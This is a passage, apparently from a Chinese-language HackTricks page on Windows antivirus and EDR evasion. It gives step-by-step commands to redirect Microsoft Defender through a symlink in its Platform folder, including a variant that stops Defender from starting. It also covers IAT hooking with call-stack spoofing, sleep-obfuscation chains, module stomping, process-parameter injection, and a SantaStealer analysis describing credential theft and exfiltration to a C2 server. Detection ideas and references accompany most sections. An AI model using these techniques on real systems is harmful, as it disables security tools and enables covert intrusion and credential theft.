- 检查配置为自动启动可疑二进制文件的新服务，以及在 Defender/AV 之前持续启动的服务。调查 Defender 启动失败前的服务创建/修改行为。
- 对 Defender 二进制文件/Platform 目录进行文件完整性监控；检查带有受保护进程标志的进程是否意外创建/修改文件。
- ETW/EDR 遥测：查找以 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV 二进制文件异常使用 PPL 级别的情况。

缓解措施
- WDAC/Code Integrity：限制哪些已签名二进制文件可以作为 PPL 运行，以及它们可以由哪些父进程启动；阻止在非正常场景下调用 ClipUp。
- 服务管理：限制自动启动服务的创建/修改，并监控启动顺序操纵行为。
- 确保已启用 Defender 防篡改和早期启动保护；调查表明二进制文件损坏的启动错误。
- 如果环境兼容，可考虑在托管安全工具的卷上禁用 8.3 短文件名生成（务必充分测试）。

## 通过 Platform 版本文件夹 Symlink Hijack 篡改 Microsoft Defender

Windows Defender 通过枚举以下目录中的子文件夹，选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择字典序最高的版本字符串对应的子文件夹（例如 `4.18.25070.5-0`），然后从中启动 Defender 服务进程（并相应更新服务/注册表路径）。此选择会信任目录项，包括目录重解析点（symlink）。管理员可利用这一点，将 Defender 重定向到攻击者可写的路径，从而实现 DLL sideloading 或造成服务中断。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- 本地管理员权限（创建 Platform 文件夹下的目录/symlink 所需）
- 能够重启，或触发 Defender 重新选择平台（在启动时重启服务）
- 仅需使用内置工具（mklink）

原理
- Defender 会阻止对自身文件夹的写入，但其平台选择机制会信任目录项，并选择字典序最高的版本，而不验证目标是否解析到受保护/可信路径。

分步说明（示例）
1) 准备当前平台文件夹的可写副本，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 中创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发方式选择（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向后的路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能看到新的进程路径位于 `C:\TMP\AV\` 下，且服务配置/注册表中反映了该位置。

后渗透选项
- DLL sideloading/code execution：放置/替换 Defender 从其应用程序目录加载的 DLL，以便在 Defender 的进程中执行代码。请参阅上文：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- 服务终止/拒绝服务：移除版本符号链接，这样下次启动时，已配置的路径将无法解析，导致 Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> 请注意，此技术本身不会提供权限提升；它需要管理员权限。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以将 runtime evasion 从 C2 implant 移到目标模块本身：Hook 其 Import Address Table (IAT)，并将选定的 API 调用转发至攻击者控制的位置无关代码 (PIC)。这让 evasion 能覆盖许多 kit 所暴露的有限 API 范围（例如 CreateProcessA），并将相同的保护扩展至 BOFs 和 post-exploitation DLL。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高层方法
- 使用 reflective loader，将 PIC blob 与目标模块一同加载（前置或作为伴随模块）。PIC 必须是自包含且位置无关的。
- 主机 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR，并将目标导入项（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）的 IAT 条目 patch 为指向精简的 PIC wrappers。
- 每个 PIC wrapper 在尾调用真实 API 地址前执行 evasion。常见的 evasion 包括：
  - 在调用前后执行 Memory mask/unmask（例如加密 beacon 区域、将 RWX→RX、更改页面名称/权限），然后在调用后恢复。
  - Call-stack spoofing：构造一个看似正常的栈，并跳转至目标 API，使 call-stack 分析解析出预期的栈帧。<sup>[[9]](#references)</sup>
- 为确保兼容性，导出一个接口，以便 Aggressor 脚本（或等效工具）注册要为 Beacon、BOFs 和 post-ex DLL Hook 的 API。

为何在此处使用 IAT hooking
- 任何使用被 Hook 导入项的代码都能受益，无需修改工具代码，也不依赖 Beacon 代理特定 API。
- 覆盖 post-ex DLL：Hook LoadLibrary* 可拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并对其 API 调用应用相同的 masking/stack evasion。
- 通过包装 CreateProcessA/W，使针对基于 call-stack 的检测的进程创建型 post-ex 命令恢复可靠运行。

最小 IAT hook 示例（x64 C/C++ 伪代码）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
笔记
- 在重定位/ASLR 之后、首次使用导入项之前应用补丁。TitanLdr/AceLdr 等 Reflective loader 展示了如何在已加载模块的 DllMain 期间进行 hooking。
- 保持 wrapper 简短且 PIC-safe；通过 patch 前捕获的原始 IAT 值或 LdrGetProcedureAddress 解析真实 API。
- 对 PIC 使用 RW → RX 转换，避免留下可写且可执行的页面。

Call-stack spoofing stub
- Draugr 风格的 PIC stub 会构造伪造的调用链（返回地址指向良性模块），随后跳转到真实 API。
- 这可以绕过那些期望 Beacon/BOF 调用敏感 API 时具有规范调用栈的检测。
- 配合 stack cutting/stack stitching 技术，在 API 序言执行前进入预期的栈帧。

操作集成
- 将 reflective loader 放在 post-ex DLL 的前面，这样 DLL 加载时 PIC 和 hooks 就会自动初始化。
- 使用 Aggressor script 注册目标 API，使 Beacon 和 BOF 无需修改代码，就能透明地使用相同的规避路径。

检测/DFIR 考量
- IAT 完整性：检查解析到非 image（heap/anon）地址的条目；定期验证导入指针。
- 栈异常：返回地址不属于已加载的 images；突然跳转到非 image PIC；RtlUserThreadStart 祖先链不一致。
- Loader 遥测：进程内对 IAT 的写入；在早期 DllMain 活动中修改导入 thunk；加载时创建异常的 RX 区域。
- Image-load 规避：如果 hooking LoadLibrary*，应监控可疑的 automation/clr 程序集加载，以及与内存 masking 事件的关联。

相关构件和示例
- 在加载期间执行 IAT patching 的 reflective loaders（例如 TitanLdr、AceLdr）
- 内存 masking hooks（例如 simplehook）和 stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例如 Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 通过常驻 PICO 实现 import-time IAT hooks

如果你控制 reflective loader，就可以在 `ProcessImports()` **期间**通过将 loader 的 `GetProcAddress` 指针替换为自定义 resolver 来 hook imports；该 resolver 会先检查 hooks：<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 构建一个 **常驻 PICO**（persistent PIC object），使其在临时 loader PIC 释放自身后仍能存活。
- 导出一个 `setup_hooks()` 函数，用于覆盖 loader 的 import resolver（例如 `funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中跳过 ordinal imports，并使用基于 hash 的 hook 查找，例如 `__resolve_hook(ror13hash(name))`。如果存在 hook，就返回它；否则调用真实的 `GetProcAddress`。
- 在链接时使用 Crystal Palace 的 `addhook "MODULE$Func" "hook"` 条目注册 hook 目标。由于 hook 位于常驻 PICO 内，因此会持续有效。

这样就能实现 **import-time IAT redirection**，无需在加载后 patch 已加载 DLL 的代码段。

### 目标使用 PEB-walking 时强制生成可 hook 的 imports

只有当函数实际存在于目标的 IAT 中时，import-time hooks 才会触发。如果模块通过 PEB-walk + hash 解析 API（没有 import 条目），就要强制生成真实 import，让 loader 的 `ProcessImports()` 路径能够看到它：

- 将基于 hash 的 export 解析（例如 `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为直接引用，例如 `&WaitForSingleObject`。
- 编译器会生成 IAT 条目，使 reflective loader 在解析 imports 时能够拦截它。

### 不 patch `Sleep()` 的 Ekko 风格 sleep/idle obfuscation

不要 patch `Sleep`，而是 hook implant 实际使用的**等待/IPC 原语**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）。对于长时间等待，可用 Ekko 风格的 obfuscation 链包装调用，在 idle 期间加密内存中的 image：<sup>[[31]](#references)[[27]](#references)</sup>

- 使用 `CreateTimerQueueTimer` 安排一系列回调，以构造好的 `CONTEXT` 帧调用 `NtContinue`。
- 常见链条（x64）：将 image 设置为 `PAGE_READWRITE` → 使用 `advapi32!SystemFunction032` 对整个映射的 image 执行 RC4 加密 → 执行阻塞等待 → RC4 解密 → 遍历 PE sections **恢复每个 section 的权限** → 发出完成信号。
- `RtlCaptureContext` 提供模板 `CONTEXT`；将其克隆到多个帧中，并设置寄存器（`Rip/Rcx/Rdx/R8/R9`）以调用每个步骤。

操作细节：对于长时间等待，返回“success”（例如 `WAIT_OBJECT_0`），让调用方在 image 被 masking 时继续执行。这种模式可在 idle 时段将模块隐藏起来，并避免经典的“patched `Sleep()`”特征。

检测思路（基于遥测）
- `CreateTimerQueueTimer` 回调大量出现，且目标指向 `NtContinue`。
- `advapi32!SystemFunction032` 被用于大型、连续且大小与 image 相当的缓冲区。
- 大范围 `VirtualProtect` 操作后，出现自定义的逐 section 权限恢复。

### 面向 sleep-obfuscation gadgets 的运行时 CFG 注册

在启用了 CFG 的目标进程中，首次间接跳转到 `jmp [rbx]` 或 `jmp rdi` 这类函数中段 gadget 时，通常会因为 gadget 不在模块的 CFG 元数据中而导致进程以 `STATUS_STACK_BUFFER_OVERRUN` 崩溃。要让 Ekko/Kraken 风格的链条在加固进程中正常运行：<sup>[[30]](#references)</sup>

- 使用 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 注册链条使用的每个间接目标，并设置 `CFG_CALL_TARGET_VALID` 条目。
- 对于已加载 images（`ntdll`、`kernel32`、`advapi32`）中的地址，`MEMORY_RANGE_ENTRY` 必须从 **image base** 开始并覆盖 **整个 image 大小**。
- 对于手动映射/PIC/stomped 区域，则应使用 **allocation base** 和 allocation size。
- 不仅要标记 dispatch gadget，还要标记间接调用到的 exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscalls），以及任何将成为间接目标的攻击者控制的可执行 sections。

这样，ROP/JOP 风格的 sleep 链条就不再是“只在非 CFG 进程中有效”的技巧，而能成为适用于 `explorer.exe`、浏览器、`svchost.exe` 及其他使用 `/guard:cf` 编译的终端的可复用原语。

### 面向 sleeping threads 的 CET-safe stack spoofing

完整替换 `CONTEXT` 会产生明显特征，而且在 CET Shadow Stack 系统上可能失效，因为伪造的 `Rip` 仍必须与硬件 shadow stack 一致。更安全的 sleep-masking 模式如下：<sup>[[30]](#references)</sup>

- 选择同一进程中的另一个线程，通过 `NtQueryInformationThread` 读取其 `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）。
- 备份当前线程真实的 TEB/TIB。
- 使用 `GetThreadContext` 捕获真实的 sleeping context。
- **只**将真实的 `Rip` 复制到 spoof context，同时保留伪造的 `Rsp`/stack state。
- 在 sleep 窗口期间，将 spoof thread 的 `NT_TIB` 复制到当前 TEB，使 stack walkers 在合法的 stack range 内进行 unwind。
- 等待结束后，恢复原始 TIB 和 thread context。

这种方式能保留与 CET 一致的 instruction pointer，同时误导那些依赖 TEB stack metadata 验证 unwind 的 EDR stack walkers。

### 替代方案：基于 APC 的 Kraken Mask

如果 timer-queue dispatch 的特征过于明显，可以通过挂起的 helper thread 使用 queued APCs 执行相同的 sleep-encrypt-spoof-restore 序列：<sup>[[27]](#references)</sup>

- 创建一个以 `NtTestAlert` 为 entrypoint 的 helper thread。
- 使用 `NtQueueApcThread` 排入准备好的 `CONTEXT` 帧/APCs，并通过 `NtAlertResumeThread` 执行它们。
- 将链条状态存储在 heap 上，而不是 helper stack 上，以免耗尽默认的 64 KB thread stack。
- 使用 `NtSignalAndWaitForSingleObject` 原子地发出 start event 信号并进入阻塞状态。
- 在恢复 TIB/context 前挂起 main thread（`NtSuspendThread` → restore → `NtResumeThread`），以缩小扫描器可能捕获到半恢复栈的竞态窗口。

这种方法将 `CreateTimerQueueTimer` + `NtContinue` 特征替换为 helper-thread/APC 特征，同时保留相同的 RC4 masking 和 stack-spoofing 目标。

其他检测思路
- 在 sleep、wait 或 APC dispatch 前不久调用 `NtSetInformationVirtualMemory` 并使用 `VmCfgCallTargetInformation`。
- 在 `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject` 或 `ConnectNamedPipe` 调用前后使用 `GetThreadContext`/`SetThreadContext`。
- 调用 `NtQueryInformationThread` 后，直接写入当前线程 TEB/TIB 的 stack bounds。
- `NtQueueApcThread`/`NtAlertResumeThread` 链条间接调用 `SystemFunction032`、`VirtualProtect` 或 section-permission restoration helpers。
- 在已签名模块中反复使用 `FF 23`（`jmp [rbx]`）或 `FF E7`（`jmp rdi`）这类短 gadget signatures 作为 dispatch pivots。


## Precision Module Stomping

Module stomping 会从**目标进程中已映射 DLL 的 `.text` section**执行 payload，而不是分配明显的私有可执行内存，或加载新的 sacrificial DLL。覆盖目标应是一个**已加载、由磁盘支持的 image**，其代码空间能够容纳 payload，且不会破坏进程仍需使用的代码路径。<sup>[[1]](#references)[[2]](#references)</sup>

### 可靠的目标选择

对 `uxtheme.dll` 或 `comctl32.dll` 等常见模块进行简单的 stomping 并不可靠：该 DLL 可能未加载到远程进程中，而代码区域过小则会导致进程崩溃。更可靠的工作流程如下：

1. 枚举目标进程的 modules，并仅保留一个**仅包含名称的 DLL include list**，其中列出已加载的 DLL。
2. 先构建 payload，并记录其**精确字节大小**。
3. 扫描磁盘上的候选 DLL，并将 PE section 的 **`.text` `Misc_VirtualSize`** 与 payload 大小进行比较。这比文件大小更重要，因为它反映了该可执行 section **映射到内存后的大小**。
4. 解析 **Export Address Table (EAT)**，选择一个导出函数的 RVA 作为 stomp 起始偏移。
5. 计算 **blast radius**：如果 payload 超过所选函数边界，就会覆盖内存中位于其后的相邻 exports。

实际中常见的侦察/选择辅助工具：

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

操作注意事项
- 优先使用远程进程中**已加载**的 DLL，以避免 `LoadLibrary`/意外映像加载产生的遥测。
- 优先选择目标应用很少执行的导出函数，否则正常代码路径可能在线程创建前后命中被覆盖的字节。
- 较大的 implant 通常需要将 shellcode 嵌入方式从字符串字面量改为**字节数组/花括号初始化器**，以便在 injector 源码中正确表示完整缓冲区。

检测思路
- 向**映像支持的可执行页面**（`MEM_IMAGE`、`PAGE_EXECUTE*`）而非更常见的私有 RWX/RX 分配区域写入数据。
- 内存中的导出函数入口点字节与磁盘上的后备文件不再匹配。
- 远程线程或上下文跳转从某个合法 DLL 导出函数内部开始执行，而该函数的首批字节近期被修改过。
- 针对 DLL `.text` 页的可疑 `VirtualProtect(Ex)` / `WriteProcessMemory` 调用序列，随后创建线程。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) 是一种**进程注入 / EDR 规避**技术，可避开经典远程写入路径（`VirtualAllocEx` + `WriteProcessMemory`）。它不是将字节复制到已运行的目标进程中，而是滥用 Windows **将选定的 `CreateProcessW` 启动参数复制到子进程中**这一行为，并将这些参数存储在 `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）中。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` 复制的可投毒载体

可用载体包括：

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（使用 `CREATE_UNICODE_ENVIRONMENT` 时）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

载体的实际限制：

- 对于 `CreateProcessW`，`lpCommandLine` 必须指向**可写内存**，且长度上限为 **32,767 个 Unicode 字符**（包括空终止符）。
- `lpEnvironment` 必须是 Unicode 环境块，由连续的 `NAME=VALUE\0` 字符串组成，并以额外的 `\0` 结尾。
- `lpReserved` 在官方文档中标记为保留项，因此应将 `ShellInfo` 映射视为实现细节，而非稳定且有文档保证的契约。

这使常规进程创建成为**payload 传输原语**。操作者使用攻击者控制的启动数据创建子进程，并由 Windows 执行跨进程复制。

### 不使用远程写入 API 的远程查找流程

创建子进程后，使用**只读**原语解析复制后的缓冲区：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → 获取 `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. 读取远程 `PEB`
3. 跟随 `PEB.ProcessParameters`
4. 读取 `RTL_USER_PROCESS_PARAMETERS`
5. 使用选定的指针：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最简流程：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### 执行复制的参数缓冲区

复制的参数区域通常是 `RW`，不可执行。常见的 P3 chain 如下：

1. 正常创建进程（不挂起）
2. 使用 `NtProtectVirtualMemory` / `VirtualProtectEx` 将选定的参数页设为可执行
3. 重用 `PROCESS_INFORMATION` 中已返回的主线程句柄
4. 使用 `NtSetContextThread`（`CONTEXT_CONTROL`，覆盖 `RIP`）重定向执行

与经典的 thread hijacking 工作流不同，这**不需要** `SuspendThread` / `ResumeThread`；可以直接通过返回的主线程句柄更改上下文。

这样可以避开多种常用于监控注入的 API：

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 通常还包括 `SuspendThread` / `ResumeThread`

### Null byte 限制与 staged shellcode

这三种载体都是**字符串或类字符串数据**，因此，传输过程中包含 `0x00` 的原始 payload 会被截断。一个实用的解决方法是使用**不含 null byte 的 first stage**，在运行时重建常量，然后加载任意 second stage。

一种简单的模式是基于 XOR 合成常量：

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

这使第一阶段能够构造栈字符串、API 参数、DLL 路径或第二阶段 shellcode 加载器，而无需在传输的参数中嵌入空字节。

### 第一阶段通过栈调用 API

当第一阶段必须调用 `LoadLibraryA` 等 API 时，可以：

- 将字符串/缓冲区压入目标栈
- 预留 **32-byte x64 shadow space**
- 将 `RCX`、`RDX`、`R8`、`R9` 设置为常量或相对于 `RSP` 的指针
- 在调用前保持 `RSP` **16-byte 对齐**

然后可以将第二阶段从栈复制到 `PAGE_READWRITE` 内存分配区域，通过 `VirtualProtect` 将其权限改为 `PAGE_EXECUTE_READ`，再跳转执行，从而避免直接分配 RWX 内存。

### 检测思路

作者提到的良好狩猎机会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` 将 **process-parameter 页面设为可执行**
- 该权限变更之后调用 `SetThreadContext` / `NtSetContextThread`
- 远程读取 `PEB`，随后读取 `RTL_USER_PROCESS_PARAMETERS`
- 创建进程时，`lpCommandLine`、`lpEnvironment` 或 `STARTUPINFO.lpReserved` 的值异常长或熵值异常高

### 注意事项

- P3 是一种**跨进程传输技巧**，本身并不是完整的执行原语：复制过去的参数仍需要修改为可执行权限，并通过某种执行重定向方法运行。
- 作者曾考虑使用 `RtlCreateProcessReflection` / Dirty Vanity，但最终放弃，因为它在内部会调用 `NtWriteVirtualMemory` 和 `NtCreateThreadEx` 等可疑原语。

## SantaStealer 用于无文件规避和凭据窃取的手法

SantaStealer（又名 BluelineStealer）展示了现代信息窃取程序如何在单个工作流中结合 AV 绕过、反分析和凭据访问。<sup>[[24]](#references)</sup>

### 键盘布局门控与沙箱延迟

- 一个配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现西里尔字母布局，样本就会创建一个空的 `CIS` 标记文件，并在运行窃取程序前终止，从而确保它不会在排除的地区引爆，同时留下可供狩猎的痕迹。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 分层 `check_antivm` 逻辑

- Variant A 遍历进程列表，使用自定义滚动校验和对每个名称进行哈希，并与内嵌的调试器/沙箱 blocklist 比较；随后对计算机名称重复执行校验和计算，并检查 `C:\analysis` 等工作目录。
- Variant B 检查系统属性（进程数量下限、近期运行时间），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox additions，并在 sleep 前后进行计时检查，以发现单步调试。命中任一检查都会在模块启动前中止。

### 无文件 helper + 双重 ChaCha20 反射式加载

- 主 DLL/EXE 内嵌了一个 Chromium 凭据 helper，它会被写入磁盘，或手动映射到内存中；无文件模式会自行解析 imports/relocations，因此不会写入任何 helper 文件。
- 该 helper 使用 ChaCha20 对第二阶段 DLL 加密两次（两个 32 字节密钥 + 两个 12 字节 nonce）。完成两轮解密后，它会以反射方式加载 blob（不调用 `LoadLibrary`），并调用从 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 派生的导出函数 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。<sup>[[25]](#references)</sup>
- ChromElevator routines 使用 direct-syscall reflective process hollowing，将代码注入正在运行的 Chromium 浏览器、继承 AppBound Encryption 密钥，并直接从 SQLite 数据库解密密码/cookies/信用卡信息，绕过 ABE hardening。

### 模块化内存采集与分块 HTTP 外传

- `create_memory_based_log` 遍历全局 `memory_generators` 函数指针表，并为每个启用的模块（Telegram、Discord、Steam、屏幕截图、文档、浏览器扩展等）创建一个线程。每个线程将结果写入共享缓冲区，并在约 45 秒的 join 等待窗口后报告文件数量。
- 完成后，所有内容会使用静态链接的 `miniz` 库压缩为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` sleep 15 秒，并通过 HTTP POST 将压缩包分成 10 MB 的数据块流式发送到 `http://<C2>:6767/upload`，同时伪装成浏览器的 `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个数据块都会添加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`；最后一个数据块会附加 `complete: true`，通知 C2 重组已完成。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

{{#include ../banners/hacktricks-training.md}}
